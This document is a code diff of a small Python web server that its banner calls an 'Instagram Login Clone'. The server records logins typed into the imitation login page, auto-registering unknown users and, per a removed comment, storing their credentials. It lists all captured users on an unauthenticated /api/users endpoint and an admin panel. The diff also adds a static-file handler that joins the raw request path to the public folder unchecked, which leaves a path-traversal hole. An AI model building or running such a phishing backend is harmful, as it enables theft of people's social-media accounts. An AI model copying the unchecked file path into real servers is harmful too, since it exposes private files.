@@ -7,11 +7,11 @@ import http.server
 import json
 import os
 import socketserver
-from urllib.parse import urlparse
 
 PORT = int(os.environ.get('PORT', 3000))
-DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'users.json')
-PUBLIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'public')
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_FILE = os.path.join(BASE_DIR, 'data', 'users.json')
+PUBLIC_DIR = os.path.join(BASE_DIR, 'public')
 
 # Ensure data directory exists
 os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
@@ -33,10 +33,38 @@ def save_users(users):
         json.dump(users, f, indent=2)
 
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
+class MyHandler(http.server.BaseHTTPRequestHandler):
+    """Custom handler that serves static files and handles API routes."""
 
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, directory=PUBLIC_DIR, **kwargs)
+    # MIME types for static files
+    MIME_TYPES = {
+        '.html': 'text/html',
+        '.css': 'text/css',
+        '.js': 'application/javascript',
+        '.json': 'application/json',
+        '.png': 'image/png',
+        '.jpg': 'image/jpeg',
+        '.svg': 'image/svg+xml',
+        '.ico': 'image/x-icon',
+    }
+
+    def do_GET(self):
+        # API: Get all users
+        if self.path == '/api/users':
+            self.send_json(get_users())
+            return
+
+        # Route: /admin -> serve admin.html
+        if self.path == '/admin' or self.path == '/admin/':
+            self.serve_file('admin.html')
+            return
+
+        # Route: / -> serve index.html
+        path = self.path.strip('/')
+        if path == '':
+            path = 'index.html'
+
+        self.serve_file(path)
 
     def do_POST(self):
         content_length = int(self.headers.get('Content-Length', 0))
@@ -55,15 +83,27 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         else:
             self.send_json({'success': False, 'message': 'Not found.'})
 
-    def do_GET(self):
-        if self.path == '/api/users':
-            self.handle_get_users()
-        elif self.path == '/admin':
-            # Serve admin.html
-            self.path = '/admin.html'
-            super().do_GET()
-        else:
-            super().do_GET()
+    def serve_file(self, filename):
+        """Serve a static file from the public directory."""
+        filepath = os.path.join(PUBLIC_DIR, filename)
+
+        if not os.path.isfile(filepath):
+            self.send_error(404, 'Not Found')
+            return
+
+        ext = os.path.splitext(filename)[1].lower()
+        mime_type = self.MIME_TYPES.get(ext, 'application/octet-stream')
+
+        try:
+            with open(filepath, 'rb') as f:
+                content = f.read()
+            self.send_response(200)
+            self.send_header('Content-Type', mime_type)
+            self.send_header('Content-Length', len(content))
+            self.end_headers()
+            self.wfile.write(content)
+        except Exception as e:
+            self.send_error(500, str(e))
 
     def handle_login(self, data):
         from datetime import datetime, timezone
@@ -93,7 +133,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
             self.send_json({'success': False, 'message': 'Sorry, your password was incorrect. Please double-check your password.'})
             return
 
-        # New user - auto-register (store their credentials)
+        # New user - auto-register
         new_user = {
             'username': username,
             'email': username,
@@ -139,10 +179,6 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
 
         self.send_json({'success': True, 'message': f"Account created for {fullname}!"})
 
-    def handle_get_users(self):
-        users = get_users()
-        self.send_json(users)
-
     def send_json(self, data):
         response = json.dumps(data).encode('utf-8')
         self.send_response(200)
@@ -151,7 +187,6 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(response)
 
-    # Suppress request logs in console (cleaner output)
     def log_message(self, format, *args):
         print(f"[{self.log_date_time_string()}] {args[0]}")
 
@@ -159,10 +194,8 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
 if __name__ == '__main__':
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
         print(f"")
-        print(f"  🚀 Instagram Login Clone Server Running!")
-        print(f"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        print(f"  📱 Login Page  → http://localhost:{PORT}")
-        print(f"  📋 Admin Panel → http://localhost:{PORT}/admin")
-        print(f"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"  Instagram Login Clone Server Running!")
+        print(f"  Login Page  -> http://localhost:{PORT}")
+        print(f"  Admin Panel -> http://localhost:{PORT}/admin")
         print(f"")
         httpd.serve_forever()
